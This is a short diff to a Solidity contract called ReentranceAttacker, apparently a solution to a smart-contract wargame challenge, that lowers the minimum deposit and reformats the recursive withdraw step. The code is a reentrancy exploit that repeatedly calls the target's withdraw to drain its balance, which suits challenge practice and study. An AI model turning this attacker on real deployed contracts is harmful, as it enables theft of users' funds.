@@ -18,7 +18,7 @@ contract ReentranceAttacker {
     }
 
     function attack() external payable {
-        require(msg.value >= 0.1 ether, "send some more ether");
+        require(msg.value >= 0.0001 ether, "send some more ether");
 
         // first deposit some funds
         initialDeposit = msg.value;
@@ -41,10 +41,9 @@ contract ReentranceAttacker {
 
         if (keepRecursing) {
             // can only withdraw at most our initial balance per withdraw call
-            uint256 toWithdraw =
-                initialDeposit < challengeTotalRemainingBalance
-                    ? initialDeposit
-                    : challengeTotalRemainingBalance;
+            uint256 toWithdraw = initialDeposit < challengeTotalRemainingBalance
+                ? initialDeposit
+                : challengeTotalRemainingBalance;
             challenge.withdraw(toWithdraw);
         }
     }
